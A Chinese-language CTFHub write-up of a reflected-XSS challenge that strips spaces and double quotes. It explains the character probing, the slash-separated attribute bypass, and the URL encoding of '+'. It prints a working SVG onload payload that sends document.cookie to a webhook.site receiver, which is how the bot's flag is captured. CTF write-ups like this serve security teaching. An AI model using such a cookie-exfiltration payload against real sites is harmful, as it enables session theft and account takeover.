---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - 空格过滤"
date: 2026-10-28

skill: "web-xss/空格过滤"
completed: true
---

# CTFHub Writeup - 空格过滤

## 题目类型

Web

## 题目描述

XSS 空格过滤
What's your name
CTFHub
Hello, CTFHub
Send URL to Bot
URL


## 解题过程

<br>1. 先访问目标根路径，返回 302，跳转到 /?name=CTFHub，说明可控参数是 name。再请求 /?name=abc，页面返回 \<h1\>Hello, abc\</h1\>，服务端把 name 原样拼进 h1，未做 HTML 转义；页面底部还存在 /submit 投递 bot 的接口。
<br>2. 用 PowerShell 循环测试空格、TAB、LF、CR、双引号、单引号、反引号、等号、斜杠、尖括号和圆括号。结果显示空格、TAB、LF、CR 以及双引号会被删除，而单引号、反引号、=、/、\<、\>、(、) 会保留；题名中的“过滤空格”实际表现为删除空格而不是拒绝请求。
<br>3. 据此整理绕过思路：空格被删除时用 / 分隔标签属性，例如 svg/onload 或 img/src/onerror；双引号被删除时属性值不加引号，JS 字符串使用单引号；拼接 cookie 使用 +，并注意裸 + 在 query 中会被解码成空格再被删除，因此需要通过 --data-urlencode 发送。目标 payload 为 \<svg/onload=fetch('https://webhook.site/\<uuid\>/'+encodeURIComponent(document.cookie))\>。
<br>4. 创建 webhook.site 接收端，POST https://webhook.site/token 后得到 uuid fca77100-da08-466a-a956-e4d3b5a13cb5，并通过 https://webhook.site/token/fca77100-da08-466a-a956-e4d3b5a13cb5/requests?sorting=newest 读取命中记录。
<br>5. 构造 payload 并在本地验证：$hook 为刚创建的 webhook 地址，payload 为 \<svg/onload=fetch('$hook/'+encodeURIComponent(document.cookie))\>，用 curl 的 -G 和 --data-urlencode 生成 URL。生成 URL 中 space-count 为 0，且响应中原样出现 \<h1\>Hello, \<svg/onload=fetch('https://webhook.site/fca77100-da08-466a-a956-e4d3b5a13cb5/'+encodeURIComponent(document.cookie))\>，说明 payload 未被二次过滤。
<br>6. 把包含 payload 的 URL 写入 body5.json，向 /submit 发送 JSON 请求体，响应为 \{"code": 0, "msg": "Successfully"\}，HTTP 状态码 200。
<br>7. 等待后查询 webhook 请求记录，命中请求的 User-Agent 为 HeadlessChrome/112.0.5615.138，Referer 为目标站点，URL 为 https://webhook.site/fca77100-da08-466a-a956-e4d3b5a13cb5/flag%3Dctfhub%7B1976796ce3de0b6fb2172263%7D。URL 解码后得到 flag=ctfhub\{1976796ce3de0b6fb2172263\}。

## 疑问与解答

### 1.

<br>问题：为什么空格被删除后仍然能构造可执行的 XSS？
<br>解答：HTML 标签属性之间不一定只能靠空格分隔，斜杠在部分标签解析中可以作为分隔手段，例如 \<svg/onload=...\> 可以让 onload 成为 SVG 元素的事件属性；由于圆括号、等号和单引号仍然保留，JS 表达式也能正常书写。

### 2.

<br>问题：为什么 payload 中的加号必须经过 URL 编码？
<br>解答：在 query string 中，裸加号可能被服务端解析为空格，随后又被题目的空格删除逻辑移除，导致字符串拼接失败。用 --data-urlencode 将加号编码为 %2B 后，服务端解码得到的才是真正的加号。

### 3.

<br>问题：为什么选择 SVG 的 onload 来触发脚本？
<br>解答：SVG 元素支持 onload 事件，payload 触发时可以直接执行 JavaScript。再配合斜杠分隔属性和单引号字符串，就能在空格、双引号被删除的限制下，用 fetch 把 document.cookie 发送到外部接收端。


## 本题的核心逻辑：


<br>漏洞核心是反射型 XSS：name 参数被原样拼入 \<h1\>Hello, ...\</h1\>，没有进行 HTML 实体编码，因此攻击者可以注入标签和事件处理器。题目的输入处理会删除空白字符和双引号，但保留 /、单引号、等号、尖括号和圆括号，所以可以用斜杠分隔属性，并用单引号构造 JS 字符串完成绕过。

<br>利用链把反射型 XSS 与 bot 结合：把构造好的 URL 提交给 /submit 后，bot 会以 HeadlessChrome 打开页面并执行脚本，脚本读取 document.cookie，再用 fetch 将编码后的内容发送到 webhook.site。接收记录中的 URL 路径解码后是 flag=ctfhub\{1976796ce3de0b6fb2172263\}，说明 cookie 中含目标 flag，并已通过外带通道泄露。


## 笔记

这道题主要学习了：

